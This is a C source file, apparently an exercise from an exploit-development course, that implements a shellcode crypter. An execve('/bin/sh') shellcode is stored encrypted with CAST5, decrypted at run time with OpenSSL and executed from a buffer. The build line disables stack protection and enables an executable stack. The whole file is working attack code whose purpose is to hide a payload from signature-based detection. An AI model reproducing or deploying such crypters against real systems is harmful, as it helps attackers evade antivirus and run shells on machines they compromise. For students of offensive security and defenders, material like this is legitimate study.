/*
 * Title: Custom Decrypter CAST5
 * Platform: linux/x86
 * Date: 2015-01-18
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
 *
 * $ gcc -Wl,-z,execstack -fno-stack-protector \
 * 	custom_decrypter-cast5.c -o custom_decrypter-cast5 -lcrypto
*/
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

#define KEY	"oXz19zT6w4GV8vtHcqx982T6O167xHAZ"
#define IV	"sh0Q4LaXUboBQMjAX"

/*
 * execve "/bin/sh" shellcode - 22 byte
*/
unsigned char *shellcode =
	"\x43\x49\x4a\x54\x24\x6b\x6a\x2b"
	"\xc4\xf7\xd7\x1f\xb3\xf8\xef\x2d"
	"\x65\xc3\x2b\x40\x63\x5f\xcb\x3f"
	"\x3b\x7b\x7a\xb7\x0d";

void
print_opcode(unsigned char *shellcode)
{
	size_t len = strlen(shellcode);
	size_t counter = 0;

	for (int i = 0; i < len; i++) {
		if (counter == 7) {
			printf("\\x%02x\n", *(shellcode + i));
			counter = 0;
		} else {
			printf("\\x%02x", *(shellcode + i));
			counter++;
		}
	}
	printf("\n\n");
}

void
execute_shellcode(unsigned char* shellcode)
{
	size_t len = strlen(shellcode);

	printf("[+] Shellcode Length:  %d\n", len);
	int (*ret)() = (int(*)())shellcode;
	ret();
}

void
handleErrors(void)
{
	ERR_print_errors_fp(stderr);
	abort();
}

int
decrypt(unsigned char *ciphertext, int ciphertext_len,
		unsigned char *key, unsigned char *iv,
		unsigned char *plaintext)
{
	EVP_CIPHER_CTX *ctx;
	int plaintext_len;
	int len;

	/* Create and initialise the context */
	if(!(ctx = EVP_CIPHER_CTX_new()))
		handleErrors();

	/* Initialise the decryption operation. */
	if(1 != EVP_DecryptInit_ex(ctx, EVP_cast5_ecb(),
				NULL, key, iv))
		handleErrors();

	/*
	 * Provide the message to be decrypted, and
	 * obtain the plaintext output.
	*/
	if(1 != EVP_DecryptUpdate(ctx, plaintext, &len,
				ciphertext, ciphertext_len))
		handleErrors();

	plaintext_len = len;

	/*
	 * Finalise the decryption. Further plaintext bytes
	 * may be written at this stage.
	*/
	if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
		handleErrors();

	plaintext_len += len;

	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);

	return plaintext_len;
}

int
main (void)
{
	unsigned char *key = KEY; /* A 256 bit key */
	unsigned char *iv = IV;   /* A 128 bit IV */

	/* Buffer for the decrypted text */
	unsigned char decryptedtext[128];
	int decryptedtext_len;

	/* Initialise the library */
	ERR_load_crypto_strings();
	OpenSSL_add_all_algorithms();
	OPENSSL_config(NULL);

	printf("[+] Encrypted shellcode is:\n");
	print_opcode(shellcode);

	/* Decrypt the ciphertext */
	decryptedtext_len = decrypt(shellcode, 24,
			key, iv, decryptedtext);

	/* Add a NULL terminator. We are expecting printable text */
	decryptedtext[decryptedtext_len] = '\0';

	printf("[+] Decrypted shellcode is:\n");
	print_opcode(decryptedtext);

	/* Execute shellcode */
	execute_shellcode(decryptedtext);

	/* Clean up */
	EVP_cleanup();
	ERR_free_strings();

	return 0;
}
